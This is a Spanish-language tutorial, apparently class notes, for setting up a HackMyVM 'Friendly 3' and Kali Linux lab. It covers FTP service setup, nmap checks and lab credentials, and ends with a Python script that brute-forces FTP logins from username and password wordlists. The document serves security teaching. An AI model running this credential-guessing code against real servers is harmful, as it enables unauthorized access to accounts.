
---

## 1. Preparativos previos

- **Hipervisor**: VMware, VirtualBox o similar instalado (Windows, macOS o Linux).
    
- **Cuentas**:
    
    - HackMyVM (descarga de la VM _Friendly 3_).
        
    - Acceso a una ISO o appliance de Kali Linux.
        
- **Red**: Ambas VMs deben poder comunicarse entre sí y con tu máquina anfitriona (modo _Bridged_ o _Host‑only_ con routing / NAT correctamente configurado).
    

---

## 2. Descarga e importación de la VM “Friendly 3”

1. Abre tu navegador y ve a HackMyVM.
    
2. En el buscador de máquinas escribe **Friendly 3** y selecciona la máquina.
    
3. Haz clic en **Download → Mega** y baja el archivo `.ova`.
    
4. En tu hipervisor:
    
    - **VirtualBox**: `Archivo → Importar servicio virtualizado…` y selecciona el `.ova`.
        
    - **VMware**: `File → Open…` y abre el `.ova`.
        
5. Espera a que termine la importación.
    

---

## 3. Configuración de red de “Friendly 3”

1. Con la VM apagada, ve a **Configuración → Red**.
    
2. Selecciona **Adaptador 1** en modo **Bridged** (o el modo que prefieras siempre que ambos equipos se vean).
    
3. Marca “Cable conectado” y **desactiva** opciones de filtrado de puertos avanzados (para evitar errores).
    
4. Guarda y arranca la VM.
    

---

## 4. Instalación y preparación de la VM Kali Linux

1. Importa o crea una máquina con **Kali Linux** (puede ser ISO o `.ova`).
    
2. Configura su **adaptador de red** de forma análoga a “Friendly 3” (mismo modo).
    
3. Arranca Kali.
    

---

## 5. Obtener direcciones IP

En **cada** VM, abre una terminal y ejecuta:

```bash
ip addr show
```

- Anota la IP de “Friendly 3” (p.ej. `192.168.0.67`).
    
- Anota la IP de Kali (p.ej. `192.168.0.66`).
    

---

## 6. Habilitar y comprobar FTP en Kali

1. Instala el servidor FTP:
    
    ```bash
    sudo apt update
    sudo apt install -y vsftpd
    ```
    
2. Inicia el servicio y habilítalo al arranque:
    
    ```bash
    sudo systemctl start vsftpd
    sudo systemctl enable vsftpd
    ```
    
3. Verifica el estado:
    
    ```bash
    sudo systemctl status vsftpd
    ```
    
4. Prueba el acceso FTP desde tu máquina anfitriona (o desde “Friendly 3”):
    
    ```bash
    ftp 192.168.0.66
    # Usuario: kali  Contraseña: kali
    ```
    
    Debes poder entrar y listar archivos.
    

---

## 7. Verificar FTP en Friendly 3

1. En Kali (o en tu anfitrión) instala nmap si no lo tienes:
    
    ```bash
    sudo apt install -y nmap
    ```
    
2. Escanea el puerto 21 de la VM “Friendly 3”:
    
    ```bash
    nmap -p 21 192.168.0.67
    ```
    
    Debería aparecer el puerto **21/tcp open ftp**.
    
3. Prueba la conexión FTP:
    
    ```bash
    ftp 192.168.0.67
    # Usuario: Juan  Contraseña: Alexis
    ```
    
    Si todo va bien, ya entras con ese usuario.
    

---

## 8. Resumen de credenciales

|Máquina|IP|Protocolo|Usuario|Contraseña|
|---|---|---|---|---|
|Kali Linux|192.168.0.66|FTP (21)|kali|kali|
|Friendly 3|192.168.0.67|FTP (21)|Juan|Alexis|

---

## 9. Preparar el entorno de desarrollo

1. Abre **Visual Studio Code**.
    
2. Crea o abre el proyecto de Python de la clase anterior.
    
3. Borra o comenta el código viejo.
    
4. Crea un nuevo archivo, por ejemplo `brute_ftp_concurrente.py`.
    
5. Define ya la estructura inicial:
    

```python
from ftplib import FTP

ftp_server = '192.168.0.67'  # Cambia con vuestra IP

user_file = 'usuarios.txt'
password_file = 'contraseñas.txt'

with open(user_file, 'r') as uf:
    usernames = uf.read().splitlines()

with open(password_file, 'r') as pf:
    passwords = pf.read().splitlines()

for username in usernames:
    for password in passwords:
        try:
            ftp = FTP(ftp_server)
            ftp.login(user=username, passwd=password)
            print(f"Conexión exitosa con usuario: {username} y contraseña: {password}")
            ftp.quit()
            exit()
        except Exception:
            print(f"Fallo con usuario: {username} y contraseña: {password} en {ftp_server}")
            try:
                ftp.quit()
            except:
                pass

print("Ataque de fuerza bruta terminado. No se encontraron credenciales válidas.")
```
    
6. Guarda y déjalo listo para la próxima sesión.
    

---

Con todo lo anterior ya tienes tu **laboratorio preparado** con dos objetivos FTP activos y un esqueleto de script multihilo en Python. En la siguiente clase implementaremos la función `ataque_ftp` con la lógica de fuerza bruta.